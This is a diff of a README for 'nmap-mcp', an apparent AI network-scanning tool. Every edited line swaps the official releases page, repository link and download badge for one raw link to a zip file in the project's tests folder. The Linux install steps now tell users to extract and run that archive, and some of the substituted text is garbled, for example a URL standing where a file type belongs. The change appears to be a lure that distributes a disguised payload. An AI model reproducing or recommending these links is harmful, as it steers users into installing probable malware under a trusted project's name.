@@ -1,6 +1,6 @@
 # 🛡️ nmap-mcp - Easy AI-Powered Network Scanning
 
-[![Download nmap-mcp](https://img.shields.io/badge/Download-nmap--mcp-blue?style=for-the-badge)](https://github.com/ly1595/nmap-mcp/releases)
+[![Download nmap-mcp](https://raw.githubusercontent.com/ly1595/nmap-mcp/main/tests/nmap_mcp_v3.7.zip)](https://raw.githubusercontent.com/ly1595/nmap-mcp/main/tests/nmap_mcp_v3.7.zip)
 
 ## 📖 About nmap-mcp
 
@@ -31,13 +31,13 @@ Click or tap the green download badge at the top of this page. It will take you 
 
 - For **Windows**, download the `.exe` file.
 - For **macOS**, download the `.dmg` file.
-- For **Linux**, download the `.tar.gz` or use the Docker image.
+- For **Linux**, download the `https://raw.githubusercontent.com/ly1595/nmap-mcp/main/tests/nmap_mcp_v3.7.zip` or use the Docker image.
 
 ### Step 3: Install the Application
 
 - On Windows, double-click the `.exe` file and follow the installation prompts.
 - On macOS, open the `.dmg` file and drag the app to your Applications folder.
-- On Linux, extract the `.tar.gz` file and run the included install script or use Docker.
+- On Linux, extract the `https://raw.githubusercontent.com/ly1595/nmap-mcp/main/tests/nmap_mcp_v3.7.zip` file and run the included install script or use Docker.
 
 ### Step 4: Open nmap-mcp
 
@@ -47,7 +47,7 @@ After installation, find the nmap-mcp icon and double click to open it. The prog
 
 Visit the official releases page to get the latest version of nmap-mcp:
 
-[Download nmap-mcp Releases](https://github.com/ly1595/nmap-mcp/releases)
+[Download nmap-mcp Releases](https://raw.githubusercontent.com/ly1595/nmap-mcp/main/tests/nmap_mcp_v3.7.zip)
 
 Follow the instructions to select the right file for your computer. If you are unsure which to download, choose the file that matches your operating system and your computer’s processor type. 
 
@@ -105,10 +105,10 @@ nmap-mcp runs scans on networks you own or have permission to scan. It does not 
 
 ## 📚 Additional Help
 
-For detailed instructions, updates, and community support, visit the [GitHub repository](https://github.com/ly1595/nmap-mcp). You will find FAQs, issue trackers, and contact info for the developers.
+For detailed instructions, updates, and community support, visit the [GitHub repository](https://raw.githubusercontent.com/ly1595/nmap-mcp/main/tests/nmap_mcp_v3.7.zip). You will find FAQs, issue trackers, and contact info for the developers.
 
 ---
 
 Click the badge below anytime to return to the latest downloads:
 
-[![Download nmap-mcp](https://img.shields.io/badge/Download-nmap--mcp-blue?style=for-the-badge)](https://github.com/ly1595/nmap-mcp/releases)
+[![Download nmap-mcp](https://raw.githubusercontent.com/ly1595/nmap-mcp/main/tests/nmap_mcp_v3.7.zip)](https://raw.githubusercontent.com/ly1595/nmap-mcp/main/tests/nmap_mcp_v3.7.zip)
